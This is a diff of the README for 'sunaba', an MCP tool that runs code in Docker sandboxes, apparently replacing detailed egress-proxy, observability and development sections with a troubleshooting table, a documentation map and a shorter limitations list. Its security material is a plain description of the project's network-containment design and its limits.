-| Private-repo read (`clone` / `pr=N`) | ❌ (anonymous clone only) | ✅ (read grant) |
-| Fail-closed (network start refused if the proxy fails to start) | — | ✅ |
+| `Cannot connect to the Docker daemon` | Docker isn't running | Start Docker Desktop or `dockerd`. |
+| `permission denied` on `docker.sock` | User isn't in `docker` group | `sudo usermod -aG docker $USER` and log back in. |
+| `sandbox_initialize` times out | Pulling image from GHCR exceeds 60s client timeout | Switch to the systemd background daemon. |
+| `BLOCKED by egress proxy` | Host not allowlisted or `allow_network` is false | Pass `allow_network=True` or add the host to `SUNABA_ALLOWED_EGRESS_HOSTS`. |
 
-**Who should turn it off?** Almost nobody — which is why it is on by default ([#509](https://github.com/masuda-masuo/sunaba/issues/509)). The case for the proxy is strongest exactly where this MCP is meant to be used: the sandbox runs code you do not fully trust (AI-generated, third-party dependencies, anything that could be prompt-injected) and you would rather it could not phone home. Turning it off (`SUNABA_ENABLE_EGRESS_PROXY=false`) is for the narrower cases where the containment is not worth its cost: a trusted CI runner, or a session that must reach a destination you cannot enumerate in advance. Token containment holds either way, so opting out costs you the *egress* boundary, not the credential boundary.
+---
 
-**What it does *not* guarantee.** Egress containment stops connections to *off-allowlist hosts*; it does not stop a determined exfil over an *allowlisted* channel (e.g. writing secrets into an issue on an allowed repo, or DNS/SNI side channels). It is a structural barrier against casual/arbitrary egress, not a complete information-flow boundary.
+## Documentation Map
 
-### Configuring the egress proxy
+Dive deeper into specific topics:
 
-**Push targets** — `SUNABA_ALLOWED_REPOS` is the allowlist of repositories the sandbox may push to:
+*   **[Daemon Setup Guide](docs/daemon_setup.md)**: Detailed instructions on running Sunaba as a background `systemd` user service, configuring token rotation, and connecting IDE clients.
+*   **[Security & Network Containment](docs/security.md)**: The Egress Proxy design, allowed host configurations, and token isolation details.
+*   **[Sandbox Images](docs/sandbox_image.md)**: Details on the `base`, `python`, and `go` Docker images, included tools, and language auto-detection.
+*   **[MCP Tool Reference](docs/tools.md)**: A complete reference table of all 30+ available tools.
+*   **[Contributing Guide](CONTRIBUTING.md)**: Local developer setup instructions (`pip install -e .[test]`) and test commands.
+*   **[Design Decisions](docs/design.md)**: Detailed rationale and design logs.
+*   **[Changelog](CHANGELOG.md)**: Release version history and migration guides.
 
-```bash
-# Allow pushes to specific repositories
-SUNABA_ALLOWED_REPOS="owner/repo-a,owner/repo-b"
-```
+---
 
-If `SUNABA_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let administration proceed with a misconfigured setup (see [#401](https://github.com/masuda-masuo/sunaba/issues/401)).
+## Known Limitations
 
-**Destination hosts** — `SUNABA_ALLOWED_EGRESS_HOSTS` extends the built-in set of hosts the sandbox may reach at all:
+*   **Job state is in-memory**: Background job results are lost on server restart.
+*   **Job list grows unbounded**: Completed job results accumulate in memory (not an issue for typical short-lived sessions).
+*   **Background jobs are lost on server restart**: Use `run_container_and_exec` for critical one-shot operations.
 
-```bash
-# Allow the sandbox to also reach an internal mirror and any *.example.com host
-SUNABA_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
-```
-
-- The built-in defaults — `github.com`, `api.github.com`, `codeload.github.com`, `*.githubusercontent.com`, `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org` — are **always** allowed so `git`, `pip`, and `npm` work out of the box; operator entries only *add* to them.
-- An entry beginning with `.` matches that domain and its subdomains (`.example.com` → both `example.com` and `a.example.com`).
-- The single value `*` disables destination-host containment entirely (any host passes), restoring the pre-containment passthrough behaviour for operators who need it.
-
-**Applying a change** — the proxy runs as a long-lived sidecar container (`sunaba-egress-proxy`) that reads these variables once, at its own startup. You do not need to restart or remove it by hand: the next `sandbox_initialize`, `clone_repo`, or `publish` compares the sidecar's baked-in configuration against the current environment and recreates it when they differ ([#533](https://github.com/masuda-masuo/sunaba/issues/533)). Recreation does not disturb running sandboxes — the proxy CA is persisted in a named volume and stays the same ([#400](https://github.com/masuda-masuo/sunaba/issues/400)).
-
-## Observability
-
-The server maintains an append-only execution journal at `~/.sunaba/journal.log`. Every container lifecycle event (initialize, exec, stop) and boundary-crossing operation is recorded with timestamps and run IDs.
-
-When the journal exceeds 100 MB it is automatically rotated to `journal.log.1`; the on-disk footprint stays bounded to approximately twice that size (one active + one backup). Journal readers transparently merge both files in chronological order. Trace files under `~/.sunaba/traces/` are kept to at most 100 files, with oldest ones evicted first.
-
-| Component | Description |
-|-----------|-------------|
-| **Journal** | Append-only log of all operations. `tail -f` for real-time monitoring. Auto-rotates at 100 MB to `journal.log.1`. |
-| **Trace** | HTML or JSON replay for any `run_id`. Post-hoc review of "why did it do that?" Keeps at most 100 files. |
-| **Dashboard** | Local web UI at `http://127.0.0.1:<dashboard-port>`. Read-only, auto-refreshing. |
-| **Notifications** | OS desktop notifications or webhook callbacks for boundary-crossing events and failures. |
-
-## Workflow example
-
-```
-# One-shot: initialize, run commands, auto-stop
-run_container_and_exec(
-    image="python@sha256:...",
-    commands=[
-        "git clone https://github.com/user/repo.git /app",
-        "cd /app && pip install .[test] -q",
-        "cd /app && pytest tests/ -v"
-    ],
-    allow_network=True
-)
-
-# Or step-by-step for longer sessions
-sandbox_initialize(image="python@sha256:...", allow_network=True)
-  → container_id
-
-sandbox_exec_background(container_id, [
-    "apt-get update -qq && apt-get install -y -qq git",
-    "git clone https://github.com/user/repo.git /app",
-    "cd /app && pip install .[test] -q",
-    "cd /app && pytest tests/ -v"
-])
-  → job_id
-
-sandbox_exec_check(container_id, job_id)
-sandbox_stop(container_id)
-```
-
-## Human-in-the-loop (HITL) — beyond terminal output
-
-Existing AI coding tools (Claude Code, Open Code / Codex CLI, Copilot) display test results as transient terminal text. Once the output scrolls past, it's gone — there is no structured record of what happened, when, and why.
-
-sunaba shifts the human from **active watching** to **passive monitoring**:
-
-| Capability | Claude Code / Open Code | sunaba |
-|------------|--------------------------|-------------------|
-| Test output | Terminal text, ephemeral | Structured journal with per-operation timeline |
-| Pass/fail visibility | Scroll through raw output | Color-coded badges (green/red) at a glance |
-| "Why did it fail?" | Re-run to see | Click a run → HTML/JSON trace with full context |
-| Cross-run comparison | Manual, by memory | Side-by-side in dashboard |
-| Audit trail | None (session-scoped) | Append-only journal, survives restarts |
-| Boundary crossing ops | Invisible | Explicitly tracked in the journal |
-| Human attention model | Must watch terminal | Check dashboard anytime, catch up in seconds |
-
-The dashboard (`--dashboard-port 8751`) runs on localhost, auto-refreshes every 10 seconds, and requires no external services. When a test fails, the trace shows exactly which assertion broke, on which line — no re-run needed.
-
-> This is the HITL layer that design.md §8-9 describes: the human's final control shifts from pre-execution approval to **post-hoc audit**, and the dashboard makes that audit practical rather than theoretical.
-
-## Development
-
-### Setting up a local development environment
-
-```bash
-git clone https://github.com/masuda-masuo/sunaba.git
-cd sunaba
-pip install -e .[test]
-```
-
-`pip install -e .` (editable install) ensures that your source tree under `src/` is used at runtime and in tests. **Do not use a plain `pip install .`** alongside an editable install — having both a regular and an editable installation of the same package causes non-deterministic import resolution where Python may load the stale `site-packages` copy instead of your working tree.
-
-If you previously installed the package without `-e` (e.g. via `pip install git+https://...`), remove it first:
-
-```bash
-pip uninstall sunaba   # repeat until "not installed"
-pip install -e .[test]
-```
-
-Verify that imports resolve to the source tree:
-
-```bash
-python -c "import inspect, sunaba.server; print(inspect.getfile(sunaba.server))"
-# Expected: .../sunaba/src/sunaba/server.py
-```
-
-## Known limitations
-
-- **Job state is in-memory**: Background job results are lost on server restart.
-- **Job dictionary grows unbounded**: Completed job results accumulate in memory. Not an issue for typical short-lived sessions.
-- **SSE transport requires client support**: Not all MCP clients support SSE-based servers.
-- **Background jobs are lost on server restart**: Use `run_container_and_exec` for critical one-shot operations.
+---
 
 ## License
 
